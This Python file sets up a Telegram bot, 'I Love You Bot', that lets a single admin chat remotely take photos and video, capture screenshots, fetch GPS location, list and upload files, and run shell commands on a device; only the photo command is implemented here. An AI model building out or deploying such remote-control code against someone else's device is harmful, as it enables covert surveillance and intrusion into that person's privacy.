import json
import os
import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from modules.helper import *

# Load config
with open("config.json") as f:
    config = json.load(f)

BOT_TOKEN = config["bot_token"]
ADMIN_ID = config["admin_chat_id"]
PASSWORD = config["password"]

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

updater = Updater(BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

# Admin check
def is_admin(update: Update):
    return str(update.effective_chat.id) == str(ADMIN_ID)

# Commands
def start(update: Update, context: CallbackContext):
    if not is_admin(update):
        log_unauthorized(update)
        return
    update.message.reply_text("I Love You Bot Active 💖\nUse /help to see commands")

def help_command(update: Update, context: CallbackContext):
    if not is_admin(update):
        log_unauthorized(update)
        return
    msg = """
/photo [0|1] - Capture photo
/video [seconds] - Record video
/screenshot - Take screenshot
/flashlight [on/off/strobe] - Flashlight control
/volume [level] - Set volume
/screen [lock/unlock] - Screen control
/status - Battery, CPU, RAM, Storage info
/location - GPS / Network location
/files [path] - List files
/media [file] - Upload file
/reminder [text] [time] - Set reminder
/shell <command> - Run shell command (admin only)
/logs - View command logs
"""
    update.message.reply_text(msg)

def photo(update: Update, context: CallbackContext):
    if not is_admin(update):
        log_unauthorized(update)
        return
    cam = 0
    if context.args:
        cam = int(context.args[0])
    file_path = take_photo(cam)
    if file_path:
        update.message.reply_photo(photo=open(file_path, 'rb'))
    else:
        update.message.reply_text("Failed to take photo")

# Add more command handlers: video, screenshot, flashlight, volume, screen, status, location, files, media, shell, reminder, logs
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("help", help_command))
dispatcher.add_handler(CommandHandler("photo", photo, pass_args=True))

updater.start_polling()
updater.idle()
